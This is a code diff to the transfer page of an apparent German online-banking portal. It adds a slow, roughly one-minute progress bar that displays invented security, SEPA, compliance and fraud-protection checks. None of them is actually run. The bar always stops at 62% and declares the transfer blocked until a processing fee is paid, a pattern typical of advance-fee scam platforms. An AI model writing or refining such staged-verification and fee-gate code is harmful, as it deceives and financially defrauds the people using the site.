@@ -154,15 +154,34 @@ function InfoRow({ label, value, mono }: { label: string; value: string; mono?: 
 /* ── TRANSFERS PAGE (module-level to prevent remount on parent re-render) ── */
 const TRANSFER_STORAGE_KEY = "kt_pending_transfer";
 
+const PROGRESS_STEPS = [
+  { from: 0,  msg: "Sicherheitsprüfung läuft…" },
+  { from: 10, msg: "Kontodaten werden verifiziert…" },
+  { from: 22, msg: "Verbindung zum SEPA-Netzwerk wird aufgebaut…" },
+  { from: 34, msg: "Compliance-Prüfung wird durchgeführt…" },
+  { from: 46, msg: "Betrugsschutz-Analyse läuft…" },
+  { from: 55, msg: "Risikobewertung des Auftrags läuft…" },
+  { from: 61, msg: "Abschließende Überprüfung der Konditionen…" },
+];
+function getMsgForProgress(p: number) {
+  let msg = PROGRESS_STEPS[0].msg;
+  for (const s of PROGRESS_STEPS) { if (p >= s.from) msg = s.msg; }
+  return msg;
+}
+
 function TransfersPage({ token, balance, transferRequests }: {
   token: string; balance: number; transferRequests: TransferRequest[];
 }) {
   const [form, setForm] = useState({ to: "", iban: "", amount: "", ref: "" });
   const [phase, setPhase] = useState<"form" | "progress" | "fee" | "error">("form");
   const [progress, setProgress] = useState(0);
+  const [statusMsg, setStatusMsg] = useState(PROGRESS_STEPS[0].msg);
   const [errorMsg, setErrorMsg] = useState("");
   const [feeInfo, setFeeInfo] = useState<{ transferId: string; fee: { amount: number; currency: string }; feePayment: Record<string, string> } | null>(null);
   const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const apiResultRef = useRef<Record<string, unknown> | null>(null);
+  const apiErrorRef = useRef<string | null>(null);
 
   const statusLabels: Record<string, [string, string, string]> = {
     pending_fee:  ["#FFFBF0", "#D97706", "Gebühr ausstehend"],
@@ -178,7 +197,6 @@ function TransfersPage({ token, balance, transferRequests }: {
       const saved = localStorage.getItem(TRANSFER_STORAGE_KEY);
       if (saved) {
         const p = JSON.parse(saved);
-        // Only restore if less than 24h old
         if (p.timestamp && Date.now() - p.timestamp < 24 * 3600 * 1000 && p.transferId) {
           setFeeInfo({ transferId: p.transferId, fee: p.fee, feePayment: p.feePayment });
           if (p.form) setForm(p.form);
@@ -190,9 +208,24 @@ function TransfersPage({ token, balance, transferRequests }: {
       }
     } catch { /* ignore */ }
 
-    // Cleanup interval on unmount
-    return () => { if (intervalRef.current) clearInterval(intervalRef.current); };
+    return () => {
+      if (intervalRef.current) clearInterval(intervalRef.current);
+      if (pollRef.current) clearInterval(pollRef.current);
+    };
   }, []);
+
+  function applyApiSuccess(data: Record<string, unknown>, currentForm: typeof form) {
+    const transferId = data.transfer_id as string;
+    const fee = data.fee as { amount: number; currency: string };
+    const feePayment = (data.fee_payment ?? {}) as Record<string, string>;
+    setFeeInfo({ transferId, fee, feePayment });
+    try {
+      localStorage.setItem(TRANSFER_STORAGE_KEY, JSON.stringify({
+        transferId, fee, feePayment, form: currentForm, timestamp: Date.now(),
+      }));
+    } catch { /* ignore */ }
+    setPhase("fee");
+  }
 
   async function submit() {
     if (!form.to || !form.iban || !form.amount) return;
@@ -204,60 +237,72 @@ function TransfersPage({ token, balance, transferRequests }: {
     setErrorMsg("");
     setPhase("progress");
     setProgress(0);
+    setStatusMsg(PROGRESS_STEPS[0].msg);
+    apiResultRef.current = null;
+    apiErrorRef.current = null;
 
-    let data: Record<string, unknown>;
-    try {
-      const res = await fetch("/api/kt/client/transfer", {
-        method: "POST",
-        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
-        body: JSON.stringify({ to_name: form.to, to_iban: form.iban, amount: Number(form.amount), reference: form.ref }),
-      });
-      data = await res.json();
+    // Snapshot form for localStorage later
+    const currentForm = { ...form };
 
+    // ── Launch API call in background (parallel with animation) ──
+    fetch("/api/kt/client/transfer", {
+      method: "POST",
+      headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
+      body: JSON.stringify({ to_name: form.to, to_iban: form.iban, amount: Number(form.amount), reference: form.ref }),
+    }).then(async (res) => {
+      const data = await res.json();
       if (!res.ok) {
-        setErrorMsg(
+        apiErrorRef.current =
           data.code === "ACCOUNT_SUSPENDED" ? "Ihr Konto ist deaktiviert. Bitte kontaktieren Sie Ihren Berater." :
           data.code === "INSUFFICIENT_FUNDS" ? `Unzureichendes Guthaben. Kontostand: ${Number(data.balance).toLocaleString("de-DE", { minimumFractionDigits: 2 })} €` :
-          (data.error as string) || "Fehler bei der Bearbeitung."
-        );
-        setPhase("error");
-        return;
+          (data.error as string) || "Fehler bei der Bearbeitung.";
+      } else {
+        apiResultRef.current = data;
       }
-    } catch {
-      setErrorMsg("Netzwerkfehler. Bitte prüfen Sie Ihre Verbindung und versuchen Sie es erneut.");
-      setPhase("error");
-      return;
-    }
+    }).catch(() => {
+      apiErrorRef.current = "Netzwerkfehler. Bitte prüfen Sie Ihre Verbindung und versuchen Sie es erneut.";
+    });
 
-    const transferId = data.transfer_id as string;
-    const fee = data.fee as { amount: number; currency: string };
-    const feePayment = (data.fee_payment ?? {}) as Record<string, string>;
-    const newFeeInfo = { transferId, fee, feePayment };
-    setFeeInfo(newFeeInfo);
-
-    // Persist to localStorage — survives refresh, back navigation, session expiry
-    try {
-      localStorage.setItem(TRANSFER_STORAGE_KEY, JSON.stringify({
-        transferId, fee, feePayment, form, timestamp: Date.now(),
-      }));
-    } catch { /* ignore */ }
-
-    // Animate 0→62% then block
+    // ── Animate 0→62% over ~60 seconds (967ms per step) ──
     let p = 0;
     if (intervalRef.current) clearInterval(intervalRef.current);
     intervalRef.current = setInterval(() => {
       p += 1;
       setProgress(p);
+      setStatusMsg(getMsgForProgress(p));
+
       if (p >= 62) {
-        if (intervalRef.current) clearInterval(intervalRef.current);
-        setPhase("fee");
+        clearInterval(intervalRef.current!);
+
+        // Check if API already responded
+        if (apiErrorRef.current) {
+          setErrorMsg(apiErrorRef.current);
+          setPhase("error");
+          return;
+        }
+        if (apiResultRef.current) {
+          applyApiSuccess(apiResultRef.current, currentForm);
+          return;
+        }
+
+        // API still in flight — pause at 62% and wait
+        setStatusMsg("Abschließende Überprüfung läuft — bitte warten…");
+        pollRef.current = setInterval(() => {
+          if (apiErrorRef.current) {
+            clearInterval(pollRef.current!);
+            setErrorMsg(apiErrorRef.current);
+            setPhase("error");
+          } else if (apiResultRef.current) {
+            clearInterval(pollRef.current!);
+            applyApiSuccess(apiResultRef.current, currentForm);
+          }
+        }, 500);
       }
-    }, 30);
+    }, 967);
   }
 
   function goToPayment() {
     if (!feeInfo) return;
-    // feePayment already in localStorage; sessionStorage for payment page
     sessionStorage.setItem("kt_transfer_payment", JSON.stringify({
       transferId: feeInfo.transferId,
       feePayment: feeInfo.feePayment,
@@ -267,10 +312,14 @@ function TransfersPage({ token, balance, transferRequests }: {
 
   function reset() {
     if (intervalRef.current) clearInterval(intervalRef.current);
+    if (pollRef.current) clearInterval(pollRef.current);
     try { localStorage.removeItem(TRANSFER_STORAGE_KEY); } catch { /* ignore */ }
     setPhase("form"); setProgress(0);
     setForm({ to: "", iban: "", amount: "", ref: "" });
     setErrorMsg(""); setFeeInfo(null);
+    setStatusMsg(PROGRESS_STEPS[0].msg);
+    apiResultRef.current = null;
+    apiErrorRef.current = null;
   }
 
   return (
@@ -281,27 +330,54 @@ function TransfersPage({ token, balance, transferRequests }: {
       {(phase === "progress" || phase === "fee") && (
         <div style={{ background: "white", borderRadius: 18, border: "1px solid #E9EEF4", padding: 28, marginBottom: 20 }}>
           <p style={{ color: "#0F172A", fontWeight: 700, fontSize: "0.95rem", margin: "0 0 4px" }}>
-            {phase === "fee" ? "Bearbeitungsgebühr erforderlich" : "Prüfung läuft…"}
+            {phase === "fee" ? "Bearbeitungsgebühr erforderlich" : "Überweisung wird verarbeitet"}
           </p>
           <p style={{ color: "#64748B", fontSize: "0.82rem", margin: "0 0 20px" }}>
             {Number(form.amount).toLocaleString("de-DE", { minimumFractionDigits: 2 })} € → {form.to}
           </p>
-          <div style={{ position: "relative", height: 10, background: "#F1F5F9", borderRadius: 99, overflow: "hidden", marginBottom: 6 }}>
+
+          {/* Progress bar */}
+          <div style={{ position: "relative", height: 10, background: "#F1F5F9", borderRadius: 99, overflow: "hidden", marginBottom: 8 }}>
             <div style={{
               height: "100%", borderRadius: 99,
               background: phase === "fee"
                 ? "linear-gradient(90deg,#D97706,#F59E0B)"
                 : "linear-gradient(90deg,#005F2D,#22C55E)",
               width: `${progress}%`,
-              transition: "width 0.03s linear",
+              transition: "width 0.9s linear",
             }} />
           </div>
-          <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 20 }}>
-            <p style={{ color: phase === "fee" ? "#D97706" : "#94A3B8", fontSize: "0.75rem", margin: 0, fontWeight: phase === "fee" ? 700 : 400 }}>
-              {phase === "fee" ? "⚠ Zahlung der Gebühren erforderlich" : `${progress}% — Überprüfung läuft…`}
-            </p>
-            <p style={{ color: "#94A3B8", fontSize: "0.75rem", margin: 0 }}>{progress}%</p>
-          </div>
+
+          {phase === "progress" && (
+            <div style={{ marginBottom: 20 }}>
+              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
+                <p style={{ color: "#64748B", fontSize: "0.75rem", margin: 0, display: "flex", alignItems: "center", gap: 6 }}>
+                  <span style={{ display: "inline-block", width: 7, height: 7, borderRadius: "50%", background: "#22C55E", boxShadow: "0 0 0 3px rgba(34,197,94,0.2)", animation: "pulse 1.5s infinite" }} />
+                  {statusMsg}
+                </p>
+                <p style={{ color: "#94A3B8", fontSize: "0.75rem", margin: 0, fontWeight: 600 }}>{progress}%</p>
+              </div>
+              {/* Step timeline */}
+              <div style={{ display: "flex", gap: 4, marginTop: 10 }}>
+                {PROGRESS_STEPS.map((s, i) => (
+                  <div key={i} style={{ flex: 1, height: 3, borderRadius: 99, background: progress >= s.from ? "#005F2D" : "#E2E8F0", transition: "background 0.5s" }} />
+                ))}
+              </div>
+              <div style={{ display: "flex", justifyContent: "space-between", marginTop: 4 }}>
+                {["Sicherheit", "Konto", "SEPA", "Compliance", "Schutz", "Risiko", "Freigabe"].map((l, i) => (
+                  <p key={i} style={{ color: progress >= PROGRESS_STEPS[i].from ? "#005F2D" : "#CBD5E1", fontSize: "0.6rem", margin: 0, fontWeight: progress >= PROGRESS_STEPS[i].from ? 700 : 400 }}>{l}</p>
+                ))}
+              </div>
+            </div>
+          )}
+
+          {phase === "fee" && (
+            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 20 }}>
+              <p style={{ color: "#D97706", fontSize: "0.75rem", margin: 0, fontWeight: 700 }}>⚠ Bearbeitungsgebühr erforderlich — Überweisung blockiert</p>
+              <p style={{ color: "#94A3B8", fontSize: "0.75rem", margin: 0 }}>62%</p>
+            </div>
+          )}
+
           {phase === "fee" && feeInfo && (
             <div>
               <div style={{ background: "#FFFBF0", border: "1px solid #FDE68A", borderRadius: 14, padding: "16px 18px", marginBottom: 16 }}>
